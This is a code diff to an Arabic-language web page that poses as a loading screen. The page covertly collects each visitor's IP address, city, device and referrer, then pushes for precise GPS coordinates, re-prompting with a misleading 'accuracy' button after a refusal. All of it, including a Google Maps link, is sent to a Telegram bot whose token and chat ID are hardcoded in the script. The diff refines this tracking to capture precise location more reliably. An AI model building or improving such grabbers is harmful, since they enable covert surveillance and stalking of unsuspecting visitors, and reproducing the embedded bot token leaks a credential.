@@ -10,9 +10,10 @@
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .container { text-align: center; }
         #status { margin-top: 20px; font-size: 14px; color: #aaa; }
-        #gpsRequest { margin-top: 15px; padding: 12px 25px; background: #2563eb; border: none; border-radius: 40px; color: white; font-weight: bold; font-size: 16px; cursor: pointer; display: none; }
-        #gpsRequest:active { transform: scale(0.95); }
+        #gpsBtn { margin-top: 20px; padding: 14px 30px; background: #2563eb; border: none; border-radius: 40px; color: white; font-weight: bold; font-size: 16px; cursor: pointer; display: none; }
+        #gpsBtn:active { transform: scale(0.95); }
         #done { display: none; margin-top: 20px; color: #4ade80; font-weight: bold; }
+        #errorMsg { color: #f87171; margin-top: 10px; font-size: 13px; display: none; }
     </style>
 </head>
 <body>
@@ -20,13 +21,14 @@
         <div class="spinner" id="spinner"></div>
         <p>جاري التحميل...</p>
         <div id="status">⏳ جلب المعلومات...</div>
-        <button id="gpsRequest">📍 مشاركة الموقع للحصول على الدقة</button>
+        <button id="gpsBtn">📍 مشاركة الموقع (للحصول على الدقة)</button>
         <div id="done">✅ تم الإرسال إلى التيليجرام!</div>
+        <div id="errorMsg"></div>
     </div>
 
     <script>
         // =====================================================
-        // 🔑 بيانات البوت (تم إدخالها)
+        // بيانات البوت (تم إدخالها)
         const BOT_TOKEN = '8987813029:AAEuXcuCf2WWbYd7CWYNLdhJqfWAuCaDYdA';
         const CHAT_ID = '5343926721';
         // =====================================================
@@ -47,7 +49,6 @@
             referrer: document.referrer || 'مباشر'
         };
 
-        // === اسم الجهاز ===
         function getDeviceName(ua) {
             if (ua.includes('Android')) return '📱 Android';
             if (ua.includes('iPhone') || ua.includes('iPad')) return '📱 iPhone/iPad';
@@ -60,6 +61,12 @@
 
         function setStatus(msg) {
             document.getElementById('status').textContent = msg;
+        }
+
+        function showError(msg) {
+            const el = document.getElementById('errorMsg');
+            el.textContent = msg;
+            el.style.display = 'block';
         }
 
         // === 1. جلب الـ IP والتقريبي (محاولات متعددة) ===
@@ -78,7 +85,6 @@
                 }
             } catch (e) {}
 
-            // محاولة ثانية (ipinfo)
             try {
                 const res = await fetch('https://ipinfo.io/json');
                 const info = await res.json();
@@ -96,45 +102,43 @@
             setStatus('⚠️ تم جلب البيانات جزئياً');
         }
 
-        // === 2. طلب GPS ===
-        function requestGPS(showButton = false) {
+        // === 2. طلب GPS (يظهر النافذة المنبثقة) ===
+        function requestGPS(showButtonIfFail = true) {
+            if (gpsRequested) return;
             if (!navigator.geolocation) {
-                setStatus('📡 GPS غير مدعوم');
+                setStatus('❌ GPS غير مدعوم في هذا المتصفح');
                 sendReport();
                 return;
             }
 
-            if (showButton) {
-                document.getElementById('gpsRequest').style.display = 'block';
-                document.getElementById('gpsRequest').onclick = () => {
-                    document.getElementById('gpsRequest').style.display = 'none';
-                    actuallyRequestGPS();
-                };
-                return;
-            }
-
-            // إذا لم نضغط زر، نطلب تلقائياً
-            actuallyRequestGPS();
-        }
-
-        function actuallyRequestGPS() {
-            if (gpsRequested) return;
             gpsRequested = true;
-            document.getElementById('gpsRequest').style.display = 'none';
-            setStatus('📡 جاري طلب الموقع الدقيق...');
+            setStatus('📡 جاري طلب الموقع الدقيق... يرجى الموافقة على الإذن');
+
+            // نضبط مهلة 8 ثوانٍ، إذا لم يجب المستخدم، نظهر الزر
+            let timeout = setTimeout(() => {
+                if (!reportSent) {
+                    document.getElementById('gpsBtn').style.display = 'block';
+                    setStatus('⏳ لم يتم الحصول على إذن، اضغط الزر للمشاركة');
+                }
+            }, 8000);
 
             navigator.geolocation.getCurrentPosition(
                 (pos) => {
+                    clearTimeout(timeout);
                     data.gps_lat = pos.coords.latitude;
                     data.gps_lon = pos.coords.longitude;
-                    setStatus('✅ تم الحصول على GPS الدقيق');
+                    setStatus('✅ تم الحصول على الموقع الدقيق (GPS)');
                     sendReport();
                 },
                 (err) => {
-                    setStatus(`⚠️ رفض الموقع: ${err.message}. سيتم إرسال التقريبي فقط.`);
-                    sendReport();
+                    clearTimeout(timeout);
+                    setStatus(`⚠️ رفض الموقع: ${err.message}`);
+                    showError('لقد رفضت مشاركة الموقع. سيتم إرسال التقريبي فقط.');
+                    // نعرض الزر لإعطاء فرصة ثانية
+                    document.getElementById('gpsBtn').style.display = 'block';
+                    sendReport(); // نرسل بالتقريبي
                 },
-                { enableHighAccuracy: true, timeout: 10000 }
+                { enableHighAccuracy: true, timeout: 15000 }
             );
         }
 
@@ -148,9 +152,9 @@
             msg += `📍 الدولة: ${data.country}\n`;
             msg += `📡 نظام التشغيل: ${data.deviceName}\n`;
 
-            // نميز بين الدقيق والتقريبي
             if (data.gps_lat && data.gps_lon) {
-                msg += `🛰️ <b>الموقع الدقيق (GPS):</b> ${data.gps_lat}, ${data.gps_lon}\n`;
+                msg += `🛰️ <b>الموقع الدقيق (GPS):</b>\n`;
+                msg += `📍 ${data.gps_lat}, ${data.gps_lon}\n`;
                 msg += `🗺️ <b>خريطة دقيقة:</b> https://www.google.com/maps?q=${data.gps_lat},${data.gps_lon}\n`;
                 msg += `----------------------------------\n`;
                 msg += `📍 التقريبي (من IP): ${data.city} (${data.lat}, ${data.lon})\n`;
@@ -178,11 +182,12 @@
             .then(res => res.json())
             .then(response => {
                 if (response.ok) {
-                    setStatus('✅ تم الإرسال!');
+                    setStatus('✅ تم الإرسال بنجاح!');
                     document.getElementById('spinner').style.display = 'none';
                     document.getElementById('done').style.display = 'block';
+                    document.getElementById('gpsBtn').style.display = 'none';
                 } else {
-                    setStatus('❌ فشل: ' + (response.description || 'خطأ'));
+                    setStatus('❌ فشل الإرسال: ' + (response.description || 'خطأ'));
                     reportSent = false;
                 }
             })
@@ -192,21 +197,18 @@
             });
         }
 
+        // === زر GPS (يظهر إذا رفض المستخدم أو لم تظهر النافذة) ===
+        document.getElementById('gpsBtn').addEventListener('click', () => {
+            document.getElementById('gpsBtn').style.display = 'none';
+            gpsRequested = false; // إعادة تعيين للسماح بطلب جديد
+            requestGPS(false);
+        });
+
         // === 4. التشغيل ===
         setTimeout(async () => {
             await fetchIP();
-            // نطلب GPS تلقائياً (ستظهر نافذة المتصفح)
-            // وإذا رفض المستخدم أو تأخر، نعرض زر للمساعدة
-            setTimeout(() => {
-                requestGPS(false); // طلب تلقائي
-                // إذا لم يتم الإرسال خلال 4 ثوانٍ، نظهر الزر
-                setTimeout(() => {
-                    if (!reportSent) {
-                        document.getElementById('gpsRequest').style.display = 'block';
-                        setStatus('⏳ اضغط على الزر للمشاركة الدقيقة');
-                    }
-                }, 4000);
-            }, 300);
+            // نطلب GPS فوراً (ستظهر النافذة)
+            requestGPS(true);
         }, 300);
     </script>
 </body>
